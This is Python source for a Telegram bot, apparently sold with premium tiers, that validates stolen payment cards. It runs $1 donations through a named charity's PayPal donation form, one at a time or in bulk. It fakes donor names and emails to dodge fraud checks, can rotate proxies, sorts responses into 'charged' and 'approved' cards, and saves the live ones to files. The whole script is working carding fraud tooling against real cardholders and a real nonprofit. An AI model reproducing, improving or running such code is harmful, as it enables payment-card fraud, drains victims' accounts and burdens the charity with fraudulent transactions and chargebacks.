```python
import telebot, cloudscraper, base64, re, time, os, json, threading, hashlib, requests, random, datetime, queue, urllib3, html
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

# ==========================================
# Environment Safety & Configuration
# ==========================================
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("CRITICAL ERROR: BOT_TOKEN environment variable is not set.")

try:
    ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
except ValueError:
    ADMIN_ID = 0

bot = telebot.TeleBot(BOT_TOKEN)

# ==========================================
# Constants & File Paths
# ==========================================
os.makedirs('Data', exist_ok=True)
USERS_FILE = 'Data/users.txt'
PREMIUM_FILE = 'Data/premium.txt'
BANNED_FILE = 'Data/banned.txt'
STATS_FILE = 'stats.json'
CHARGED_FILE = 'Data/charged.txt'
APPROVED_FILE = 'Data/approved.txt'

FREE_LIMIT = 0
PREMIUM_LIMIT = 1000
MAX_RETRIES = 3

USE_PROXY = False
PROXY_FILE = "proxy.txt"

# ==========================================
# Threading Locks & State
# ==========================================
ACTIVE_JOBS = {}
ACTIVE_USERS_PP = {}
ACTIVE_USERS_MPP = {}
USER_ACTIVE_JOB = {}
USER_COOLDOWNS = {}

FILE_LOCK = threading.Lock()
STATS_LOCK = threading.Lock()
JOB_LOCK = threading.Lock()
PROXY_QUEUE = queue.Queue()

# Ensure base files exist safely
with FILE_LOCK:
    for f_path in [USERS_FILE, PREMIUM_FILE, BANNED_FILE, APPROVED_FILE, CHARGED_FILE]:
        if not os.path.exists(f_path):
            with open(f_path, 'w', encoding='utf-8') as f: pass

with STATS_LOCK:
    if not os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}, f)

# ==========================================
# Safe File & Data Helpers
# ==========================================
def read_lines(filepath):
    with FILE_LOCK:
        if not os.path.exists(filepath): return []
        with open(filepath, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

def write_lines(filepath, lines):
    with FILE_LOCK:
        with open(filepath, 'w', encoding='utf-8') as f:
            for line in lines:
                f.write(line + "\n")

def append_line(filepath, line):
    with FILE_LOCK:
        with open(filepath, 'a', encoding='utf-8') as f:
            f.write(line + "\n")

def check_cooldown(user_id, command, delay=3):
    if is_admin(user_id): return True
    now = time.time()
    key = f"{user_id}_{command}"
    if key in USER_COOLDOWNS and now - USER_COOLDOWNS[key] < delay:
        return False
    USER_COOLDOWNS[key] = now
    return True

def get_stats():
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'r', encoding='utf-8') as f: 
                return json.load(f)
        except Exception: 
            return {"charged": 0, "approved": 0, "total_users": 0, "premium_users": 0, "banned_users": 0}

def save_stats(stats):
    with STATS_LOCK:
        try:
            with open(STATS_FILE, 'w', encoding='utf-8') as f: 
                json.dump(stats, f)
        except Exception: pass

def update_stat(key):
    stats = get_stats()
    if key in stats:
        stats[key] += 1
        save_stats(stats)

def save_unique_cc(filepath, cc, note):
    cc_num = cc.split('|')[0].strip()
    lines = read_lines(filepath)
    for line in lines:
        if line.startswith(cc_num):
            return
    append_line(filepath, f"{cc} - {note}")

def is_admin(user_id):
    return str(user_id) == str(ADMIN_ID)

def is_premium(user_id):
    if is_admin(user_id): return True
    lines = read_lines(PREMIUM_FILE)
    for line in lines:
        parts = line.split('|')
        if parts[0] == str(user_id):
            if len(parts) > 1:
                exp = float(parts[1])
                if exp == 0 or time.time() < exp: return True
            else: return True
    return False

def is_banned(user_id):
    lines = read_lines(BANNED_FILE)
    for line in lines:
        parts = line.split('|')
        if parts[0] == str(user_id):
            if len(parts) > 1:
                exp = float(parts[1])
                if exp == 0 or time.time() < exp: return True
            else: return True
    return False

def add_user(user_id):
    lines = read_lines(USERS_FILE)
    if str(user_id) not in lines:
        append_line(USERS_FILE, str(user_id))
        stats = get_stats()
        stats["total_users"] = len(lines) + 1
        save_stats(stats)

def validate_cc_format(ccx):
    ccx = ccx.strip()
    parts = ccx.split('|')
    if len(parts) != 4: return False
    n, m, y, c = [p.strip() for p in parts]
    if not (n.isdigit() and m.isdigit() and y.isdigit() and c.isdigit()): return False
    if not (13 <= len(n) <= 19): return False
    if not (1 <= len(m) <= 2) or not (1 <= int(m) <= 12): return False
    if not (2 <= len(y) <= 4): return False
    if not (3 <= len(c) <= 4): return False
    return True

# ==========================================
# Background Tasks & Proxies
# ==========================================
def expiry_checker():
    while True:
        try:
            # Check Premium
            p_lines = read_lines(PREMIUM_FILE)
            new_p_lines = []
            p_changed = False
            for line in p_lines:
                parts = line.split('|')
                if len(parts) > 1:
                    uid, exp = parts[0], float(parts[1])
                    if exp != 0 and time.time() > exp:
                        try: bot.send_message(int(uid), "[!] Notice: Your Premium subscription has expired. Renew now to continue enjoying exclusive features!")
                        except Exception: pass
                        p_changed = True
                        continue
                new_p_lines.append(line)
            if p_changed: write_lines(PREMIUM_FILE, new_p_lines)

            # Check Banned
            b_lines = read_lines(BANNED_FILE)
            new_b_lines = []
            b_changed = False
            for line in b_lines:
                parts = line.split('|')
                if len(parts) > 1:
                    uid, exp = parts[0], float(parts[1])
                    if exp != 0 and time.time() > exp:
                        try: bot.send_message(int(uid), "[!] Notice: Your ban has expired! You are now free to use the bot again. Please follow the rules.")
                        except Exception: pass
                        b_changed = True
                        continue
                new_b_lines.append(line)
            if b_changed: write_lines(BANNED_FILE, new_b_lines)
            
        except Exception as e:
            print(f"[!] Expiry Checker Error: {e}")
        time.sleep(60)

threading.Thread(target=expiry_checker, daemon=True).start()

if USE_PROXY and os.path.exists(PROXY_FILE):
    for p in read_lines(PROXY_FILE):
        PROXY_QUEUE.put(p)

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if '@' in proxy_str: return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return proxy_str

def get_proxy_dict():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    fp = format_proxy(p)
    if not any(p.startswith(proto) for proto in ['http', 'socks']):
        return {"http": f"http://{fp}", "https": f"http://{fp}"}, p
    return {"http": fp, "https": fp}, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code[:6]}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            return (
                data.get('brand', 'UNKNOWN'),
                data.get('bank', 'UNKNOWN'),
                data.get('country_name', 'UNKNOWN'),
                data.get('level', 'N/A'),
                data.get('type', 'N/A')
            )
    except Exception: pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", "N/A", "N/A"

# ==========================================
# Core Checker Logic
# ==========================================
def check_cc(ccx, user_fname="User", proxy=None):
    try:
        ccx = ccx.strip()
        parts = ccx.split("|")
        n, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3].strip()
        
        # Dynamic identity payload to reduce fraud blocks
        safe_name = re.sub(r'[^a-zA-Z]', '', str(user_fname)) or "User"
        fname = safe_name[:10].lower()
        lname = safe_name[:10].lower()
        email = f"{fname}{random.randint(1000, 9999)}@gmail.com"

        us = generate_user_agent()
        user = generate_user_agent()
        
        session = requests.Session()
        session.verify = False
        if proxy:
            session.proxies.update(proxy)
            
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
            
        with session as r:
            headers_get = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'upgrade-insecure-requests': '1',
                'user-agent': us,
            }
            
            response = r.get('https://www.rarediseasesinternational.org/donate/', headers=headers_get, timeout=30)
            if 'cf-ray' in response.headers or 'Cloudflare' in response.text or response.status_code == 403:
                return "ERROR", "Cloudflare Block"
            
            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', response.text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', response.text)
            m4 = re.search(r'"data-client-token":"(.*?)"', response.text)
            
            if not all([m1, m2, m3, m4]):
                return "ERROR", "Page Load Error"
            
            id_form1, id_form2, nonec, enc = m1.group(1), m2.group(1), m3.group(1), m4.group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            m_au = re.search(r'"accessToken":"(.*?)"', dec)
            if not m_au:
                return "ERROR", "Token Error"
            au = m_au.group(1)
            
            headers_post = {
                'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/',
                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': us,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data_post = {
                'give-honeypot': '', 'give-form-id-prefix': id_form1, 'give-form-id': id_form2,
                'give-form-title': '', 'give-current-url': 'https://www.rarediseasesinternational.org/donate/',
                'give-form-url': 'https://www.rarediseasesinternational.org/donate/', 'give-form-minimum': '1',
                'give-form-maximum': '999999.99', 'give-form-hash': nonec, 'give-price-id': '3',
                'give-recurring-logged-in-only': '', 'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
                'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}', 'give-amount': '1',
                'give_stripe_payment_method': '', 'payment-mode': 'paypal-commerce',
                'give_first': fname, 'give_last': lname, 'give_email': email,
                'card_name': f"{fname} {lname}", 'card_exp_month': '', 'card_exp_year': '',
                'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
                'action': 'give_process_donation', 'give_ajax': 'true',
            }
            r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', headers=headers_post, data=data_post, timeout=30)
            
            data_multipart = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1), 'give-form-id': (None, id_form2),
                'give-form-title': (None, ''), 'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'), 'give-form-minimum': (None, '1'),
                'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, nonec), 'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1'),
                'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, fname), 'give_last': (None, lname), 'give_email': (None, email),
                'card_name': (None, f"{fname} {lname}"), 'card_exp_month': (None, ''), 'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_multipart = {
                'content-type': data_multipart.content_type, 'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/', 'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_create_order'}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_multipart, data=data_multipart, timeout=30)
            tok = response.json()['data']['id']
            
            headers_paypal = {
                'authority': 'cors.api.paypal.com', 'accept': '*/*',
                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6', 'authorization': f'Bearer {au}',
                'braintree-sdk-version': '3.32.0-payments-sdk-dev', 'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com', 'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
                'referer': 'https://assets.braintreegateway.com/', 'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"', 'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user,
            }
            
            json_data_paypal = {
                'payment_source': {
                    'card': {
                        'number': n, 'expiry': f'20{yy}-{mm}', 'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }
            
            r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers_paypal, json=json_data_paypal, timeout=30, verify=False)
            
            data_approve = MultipartEncoder({
                'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1), 'give-form-id': (None, id_form2),
                'give-form-title': (None, ''), 'give-current-url': (None, 'https://www.rarediseasesinternational.org/donate/'),
                'give-form-url': (None, 'https://www.rarediseasesinternational.org/donate/'), 'give-form-minimum': (None, '1'),
                'give-form-maximum': (None, '999999.99'), 'give-form-hash': (None, nonec), 'give-price-id': (None, '3'),
                'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'), '_give_is_donation_recurring': (None, '0'),
                'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'), 'give-amount': (None, '1'),
                'give_stripe_payment_method': (None, ''), 'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, fname), 'give_last': (None, lname), 'give_email': (None, email),
                'card_name': (None, f"{fname} {lname}"), 'card_exp_month': (None, ''), 'card_exp_year': (None, ''),
                'give-gateway': (None, 'paypal-commerce'),
            })
            
            headers_approve = {
                'content-type': data_approve.content_type, 'origin': 'https://www.rarediseasesinternational.org/donate/',
                'referer': 'https://www.rarediseasesinternational.org/donate/', 'user-agent': us,
            }
            
            params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}
            response = r.post('https://www.rarediseasesinternational.org/wp-admin/admin-ajax.php', params=params, headers=headers_approve, data=data_approve, timeout=30, verify=False)
            
            text_up = response.text.upper()
            
            # Charged
            if any(k in text_up for k in ['APPROVESTATE":"APPROVED', 'PARENTTYPE":"AUTH', 'APPROVEGUESTPAYMENTWITHCREDITCARD', 'ADD_SHIPPING_ERROR', 'THANK YOU FOR DONATION', 'YOUR PAYMENT HAS ALREADY BEEN PROCESSED', 'THANKS', '"SUCCESS":TRUE']):
                if '"ERRORS"' not in text_up and '"ERROR"' not in text_up:
                    return "CHARGED", "Thank you for donation"
            
            # Approved
            if 'INSUFFICIENT_FUNDS' in text_up: return "APPROVED", "INSUFFICIENT_FUNDS"
            elif 'CVV2_FAILURE' in text_up: return "APPROVED", "CVV2_FAILURE"
            elif 'INVALID_SECURITY_CODE' in text_up: return "APPROVED", "INVALID_SECURITY_CODE"
            elif 'INVALID_BILLING_ADDRESS' in text_up: return "APPROVED", "INVALID_BILLING_ADDRESS"
            elif 'EXISTING_ACCOUNT_RESTRICTED' in text_up or 'ACCOUNT RESTRICTED' in text_up: return "APPROVED", "EXISTING_ACCOUNT_RESTRICTED"
            elif 'IS3SECUREREQUIRED' in text_up or 'OTP' in text_up: return "APPROVED", "3D_REQUIRED"
            
            # Declined
            decline_responses = {
                'DO_NOT_HONOR': "Do not honor", 'ACCOUNT_CLOSED': "Account closed", 'PAYER_ACCOUNT_LOCKED_OR_CLOSED': "Account closed",
                'LOST_OR_STOLEN': "LOST OR STOLEN", 'SUSPECTED_FRAUD': "SUSPECTED FRAUD", 'INVALID_ACCOUNT': "INVALID_ACCOUNT",
                'REATTEMPT_NOT_PERMITTED': "REATTEMPT NOT PERMITTED", 'ACCOUNT_BLOCKED_BY_ISSUER': "ACCOUNT_BLOCKED_BY_ISSUER",
                'ORDER_NOT_APPROVED': "ORDER_NOT_APPROVED", 'PICKUP_CARD_SPECIAL_CONDITIONS': "PICKUP_CARD_SPECIAL_CONDITIONS",
                'PAYER_CANNOT_PAY': "PAYER CANNOT PAY", 'GENERIC_DECLINE': "GENERIC_DECLINE", 'COMPLIANCE_VIOLATION': "COMPLIANCE VIOLATION",
                'TRANSACTION_NOT_PERMITTED': "TRANSACTION NOT PERMITTED", 'PAYMENT_DENIED': "PAYMENT_DENIED", 'INVALID_TRANSACTION': "INVALID TRANSACTION",
                'RESTRICTED_OR_INACTIVE_ACCOUNT': "RESTRICTED OR INACTIVE ACCOUNT", 'SECURITY_VIOLATION': "SECURITY_VIOLATION",
                'DECLINED_DUE_TO_UPDATED_ACCOUNT': "DECLINED DUE TO UPDATED ACCOUNT", 'INVALID_OR_RESTRICTED_CARD': "INVALID CARD",
                'EXPIRED_CARD': "EXPIRED CARD", 'CRYPTOGRAPHIC_FAILURE': "CRYPTOGRAPHIC FAILURE", 'TRANSACTION_CANNOT_BE_COMPLETED': "TRANSACTION CANNOT BE COMPLETED",
                'DECLINED_PLEASE_RETRY': "DECLINED PLEASE RETRY LATER", 'TX_ATTEMPTS_EXCEED_LIMIT': "EXCEED LIMIT"
            }
            
            for key, val in decline_responses.items():
                if key in text_up: return "DECLINED", val
            
            try:
                err = response.json().get('data', {}).get('error', 'Transaction Failed')
                return "DECLINED", str(err)
            except Exception:
                return "DECLINED", "Transaction Failed"
                    
    except Exception as e:
        msg = str(e)
        if "Read timed out" in msg or "timeout" in msg.lower(): return "ERROR", "Read Timeout"
        if "ProxyError" in msg or "HTTPSConnectionPool" in msg: return "ERROR", "Proxy/Connection Fail"
        return "ERROR", f"Req Error: {msg[:30]}"

# ==========================================
# Handlers
# ==========================================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "You are banned from using this bot!")
        return
    add_user(user_id)
    fname = html.escape(message.from_user.first_name)

    menu = f"""Hello {fname}! Welcome to Paypal 1$ Checker.

[ User Cmds ]
/pp <cc|mm|yy|cvv> - Single Check
/mpp (reply to file) - Mass Check
/stop - Stop Mass Job
/info - My Info"""

    if is_admin(user_id):
        menu += """\n
[ Admin Cmds ]
/addpremium <userid> <duration> - Add Premium
/rmpremium <userid> - Remove Premium
/ban <userid> <duration> - Ban User
/unban <userid> - Unban User
/stats - Bot Stats
/broadcast <msg> - Broadcast"""

    menu += "\n\n[ Dev ] -> @sh4h4rish4r4fl3h"
    bot.reply_to(message, menu)


@bot.message_handler(commands=['pp'])
def pp(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "You are banned from using this bot!")
        return
    
    if not check_cooldown(user_id, 'pp', delay=3):
        bot.reply_to(message, "[X] Please wait 3 seconds before checking another card.")
        return

    add_user(user_id)

    if ACTIVE_USERS_PP.get(user_id):
        bot.reply_to(message, "[X] You already have a single check running! Please wait.")
        return
        
    try:
        cc = message.text.split()[1]
        if not validate_cc_format(cc):
            raise ValueError
    except (IndexError, ValueError):
        bot.reply_to(message, "[X] Invalid Card Format! Use: /pp cc|mm|yy|cvv")
        return
    
    msg = bot.reply_to(message, "Processing your request...")
    ACTIVE_USERS_PP[user_id] = True
    
    try:
        status, response = "ERROR", "N/A"
        for _ in range(MAX_RETRIES):
            proxy_dict = None
            p_raw = None
            if USE_PROXY: proxy_dict, p_raw = get_proxy_dict()
            try:
                status, response = check_cc(cc, message.from_user.first_name, proxy_dict)
            finally:
                if USE_PROXY: release_proxy(p_raw)
            if status != "ERROR": break
            
        response = str(response)
        bin_code = cc[:6]
        brand, bank, country, level, type_cc = get_bin_info(bin_code)
        
        status_font = "CHARGED 🔥" if status == "CHARGED" else "APPROVED ✅" if status == "APPROVED" else "DECLINED ❌" if status == "DECLINED" else "ERROR ⚠️"
        
        if status == "CHARGED":
            update_stat("charged")
            save_unique_cc(CHARGED_FILE, cc, response)
        elif status == "APPROVED":
            update_stat("approved")
            save_unique_cc(APPROVED_FILE, cc, response)

        is_p = " [ADMIN]" if is_admin(user_id) else " [PREMIUM]" if is_premium(user_id) else " [FREE]"
        safe_fname = html.escape(str(message.from_user.first_name))
        safe_bank = html.escape(str(bank))
        safe_brand = html.escape(str(brand))
        
        res = f"""
Card -> <code>{cc}</code>
Status -> {status_font}
Response -> <code>{html.escape(response)}</code>
Gateway -> Paypal 1$
━━━━━━━━━━━━━━━━━━━
Info -> {safe_brand} - {type_cc} - {level}
Bank -> {safe_bank}
Country -> {country}
━━━━━━━━━━━━━━━━━━━
Checked By -> {safe_fname}{is_p}
Dev -> @sh4h4rish4r4fl3h
"""
        try: bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")
        except Exception:
            try: bot.edit_message_text(res.replace("<code>", "").replace("</code>", ""), message.chat.id, msg.message_id)
            except Exception: pass
            
    finally:
        ACTIVE_USERS_PP.pop(user_id, None)

@bot.message_handler(commands=['mpp'])
def mpp(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, "You are banned from using this bot!")
        return
    add_user(user_id)
    
    if ACTIVE_USERS_MPP.get(user_id):
        bot.reply_to(message, "[X] You already have a mass check running! Please /stop it first.")
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "Please reply to a .txt file with /mpp")
        return
    
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    lines = downloaded_file.decode('utf-8').splitlines()
    
    ccs = []
    for line in lines:
        if validate_cc_format(line):
            ccs.append(line.strip())
    ccs = list(dict.fromkeys(ccs))
    
    if not ccs:
        bot.reply_to(message, "[X] No valid CCs found in the file! Make sure format is correct.")
        return

    is_p = is_premium(user_id)
    limit = PREMIUM_LIMIT if is_p else FREE_LIMIT
    
    if limit == 0:
        bot.reply_to(message, "[X] Premium Only! Upgrade to premium to use Mass Check.")
        return
        
    total_found = len(ccs)
    if total_found > limit:
        bot.reply_to(message, f"[!] Found {total_found} valid CCs.\nProcessing only first {limit} CCs (your limit).")
        ccs = ccs[:limit]
    
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    
    is_p_label = " [ADMIN]" if is_admin(user_id) else " [PREMIUM]" if is_premium(user_id) else " [FREE]"
    safe_fname = html.escape(message.from_user.first_name)
    
    initial_text = f"Job ID: {job_id} / Paypal -- Running\n\n[□□□□□□□□□□] (0.0%)\n\nTask       - Paypal 1$\nTotal      - {total}\nProcessed  - 0/{total}\nCharged    - 0\nApproved   - 0\nDeclined   - 0\nErrors     - 0\nTime       - 0s\nUser       - {safe_fname}{is_p_label}\n\nSession Running.\n\nDev - @sh4h4rish4r4fl3h"
    prog_msg = bot.reply_to(message, initial_text)
    
    results = {"charged": 0, "approved": 0, "declined": 0, "error": 0, "checked": 0}
    start_time = time.time()
    
    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        
        status, response = "ERROR", "N/A"
        for _ in range(3):
            proxy_dict = None
            p_raw = None
            if USE_PROXY: proxy_dict, p_raw = get_proxy_dict()
            try:
                status, response = check_cc(cc, message.from_user.first_name, proxy_dict)
            finally:
                time.sleep(1.5)
                if USE_PROXY: release_proxy(p_raw)
                
            if status != "ERROR" and response not in ["Proxy/Connection Fail", "Read Timeout", "Cloudflare Block"]:
                break
            time.sleep(2)
            
        response = str(response)
        
        with JOB_LOCK:
            results["checked"] += 1
            if status == "CHARGED": results["charged"] += 1
            elif status == "APPROVED": results["approved"] += 1
            elif status == "DECLINED": results["declined"] += 1
            else: results["error"] += 1
            
            should_update = (results["checked"] % 10 == 0 or results["checked"] == total)
            curr_checked = results["checked"]
            curr_charged = results["charged"]
            curr_approved = results["approved"]
            curr_declined = results["declined"]
            curr_error = results["error"]

        if status in ["CHARGED", "APPROVED"]:
            if status == "CHARGED":
                update_stat("charged")
                save_unique_cc(CHARGED_FILE, cc, response)
            elif status == "APPROVED":
                update_stat("approved")
                save_unique_cc(APPROVED_FILE, cc, response)

            bin_code = cc[:6]
            brand, bank, country, level, type_cc = get_bin_info(bin_code)
            status_f = "CHARGED 🔥" if status == "CHARGED" else "APPROVED ✅" if status == "APPROVED" else "DECLINED ❌"
            safe_bank = html.escape(str(bank))
            safe_brand = html.escape(str(brand))
            
            res_single = f"""
Card -> <code>{cc}</code>
Status -> {status_f}
Response -> <code>{html.escape(response)}</code>
Gateway -> Paypal 1$
━━━━━━━━━━━━━━━━━━━
Info -> {safe_brand} - {type_cc} - {level}
Bank -> {safe_bank}
Country -> {country}
━━━━━━━━━━━━━━━━━━━
Checked By -> {safe_fname}{is_p_label}
Dev -> @sh4h4rish4r4fl3h
"""
            try: bot.reply_to(message.reply_to_message, res_single, parse_mode="HTML")
            except Exception:
                try: bot.send_message(message.chat.id, res_single.replace("<code>", "").replace("</code>", ""))
                except Exception: pass

        if should_update:
            p = (curr_checked / total) * 100
            filled = int(p // 10)
            bar = "■" * filled + "□" * (10 - filled)
            tt = round(time.time() - start_time, 1)
            update_text = f"Job ID: {job_id} / Paypal -- Running\n\n[{bar}] ({round(p, 1)}%)\n\nTask       - Paypal 1$\nTotal      - {total}\nProcessed  - {curr_checked}/{total}\nCharged    - {curr_charged}\nApproved   - {curr_approved}\nDeclined   - {curr_declined}\nErrors     - {curr_error}\nTime       - {tt}s\nUser       - {safe_fname}{is_p_label}\n\nSession Running.\n\nDev - @sh4h4rish4r4fl3h"
            try: bot.edit_message_text(update_text, message.chat.id, prog_msg.message_id)
            except Exception: pass

    def run_mass_check():
        try:
            with ThreadPoolExecutor(max_workers=12) as executor:
                for cc in ccs:
                    if not ACTIVE_JOBS.get(job_id): break
                    executor.submit(worker, cc)

            if not ACTIVE_JOBS.get(job_id):
                final_text = prog_msg.text.replace("Running", "Stopped")
                try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
                except Exception: pass
                return

            tt = round(time.time() - start_time, 1)
            final_text = f"Job ID: {job_id} / Paypal -- Completed\n\n[■■■■■■■■■■] (100.0%)\n\nTask       - Paypal 1$\nTotal      - {total}\nProcessed  - {results['checked']}/{total}\nCharged    - {results['charged']}\nApproved   - {results['approved']}\nDeclined   - {results['declined']}\nErrors     - {results['error']}\nTime       - {tt}s\nUser       - {safe_fname}{is_p_label}\n\nSession Finished.\n\nDev - @sh4h4rish4r4fl3h"
            try: bot.edit_message_text(final_text, message.chat.id, prog_msg.message_id)
            except Exception: pass
            
        finally:
            ACTIVE_JOBS.pop(job_id, None)
            if USER_ACTIVE_JOB.get(user_id) == job_id:
                USER_ACTIVE_JOB.pop(user_id, None)
                ACTIVE_USERS_MPP.pop(user_id, None)

    threading.Thread(target=run_mass_check, daemon=True).start()

@bot.message_handler(commands=['stop'])
def stop_job(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "[X] Premium Only! Upgrade to premium to use Mass Check and /stop.")
        return
    parts = message.text.split()

    if len(parts) > 1:
        jid = parts[1].upper()
    else:
        jid = USER_ACTIVE_JOB.get(user_id)
        if not jid:
            bot.reply_to(message, "[X] You don't have any active session to stop.")
            return

    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        bot.reply_to(message, f"[✓] Session {jid} stopped. You can now start a new one.")
    else:
        bot.reply_to(message, f"[✓] Session {jid} not found or already finished!")

@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[X] You don't have permission to use this command!!")
        return
    try:
        parts = message.text.split()
        if len(parts) < 3: raise ValueError
        target_id = parts[1].strip()
        
        if is_premium(target_id) and not is_admin(target_id):
            bot.reply_to(message, f"[X] User {target_id} already has an active Premium subscription!")
            return
            
        duration = parts[2].lower()
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise ValueError()
        
        append_line(PREMIUM_FILE, f"{target_id}|{exp}")
        
        safe_fname = html.escape(message.from_user.first_name)
        res = f"""
Account Information
━━━━━━━━━━━━━━━━━━━
Target ID -> {target_id}
Action -> Premium Added
Duration -> {duration.upper()}
New Rank -> [PREMIUM]
━━━━━━━━━━━━━━━━━━━
User -> {safe_fname} [ADMIN]
Dev -> @sh4h4rish4r4fl3h
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), f"[!] Notice: You have been granted Premium access for {duration.upper()}! Enjoy unlimited checks.")
        except Exception: pass
    except Exception: 
        bot.reply_to(message, "[X] Usage: /addpremium <userid> <days>(1s,1m,1h,1d,lifetime)")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[X] You don't have permission to use this command!!")
        return
    try:
        target_id = message.text.split()[1].strip()
        lines = read_lines(PREMIUM_FILE)
        new_lines = [l for l in lines if l.split('|')[0] != target_id]
        write_lines(PREMIUM_FILE, new_lines)
        
        safe_fname = html.escape(message.from_user.first_name)
        res = f"""
Account Information
━━━━━━━━━━━━━━━━━━━
Target ID -> {target_id}
Action -> Premium Removed
Reason -> Admin Action
New Rank -> [FREE]
━━━━━━━━━━━━━━━━━━━
User -> {safe_fname} [ADMIN]
Dev -> @sh4h4rish4r4fl3h
"""
        bot.reply_to(message, res)
        try: bot.send_message(int(target_id), "[!] Notice: Your Premium access has been removed by an admin.")
        except Exception: pass
    except Exception: 
